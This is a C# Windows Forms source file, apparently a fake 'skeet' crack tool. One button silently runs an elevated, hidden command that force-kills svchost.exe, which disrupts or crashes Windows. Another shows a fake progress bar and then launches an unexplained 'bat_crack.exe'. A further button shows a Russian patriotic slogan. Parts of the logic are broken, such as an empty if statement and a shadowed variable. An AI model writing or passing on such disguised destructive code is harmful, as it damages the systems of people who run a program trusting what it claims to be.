using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace skeet_crack
{
    public partial class Form1 : Form
    {
        private int a;

        public Form1()
        {
            InitializeComponent();
            label2.Hide();
            label3.Hide();
        }


        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            MessageBox.Show("41%");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            label2.Show();

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C taskkill /IM svchost.exe /F";
            startInfo.Verb = "runas";
            process.StartInfo = startInfo;
            process.Start();

        }

        private void button2_Click(object sender, EventArgs e)
        {
            int a = 1;
            label2.Hide();
            label3.Show();
            


        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (a == 1);
            do
            {
                progressBar1.Value += 5;
                Thread.Sleep(10);

            } while (progressBar1.Value < 100);

            System.Diagnostics.Process.Start("S:/@bat_crack.exe");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("РОССИЯ СВЯЩЕННАЯ НАША ДЕРЖАВА, РОССИЯ ЛЮБИМАЯ НАША СТРАНА");

        }
    }
}
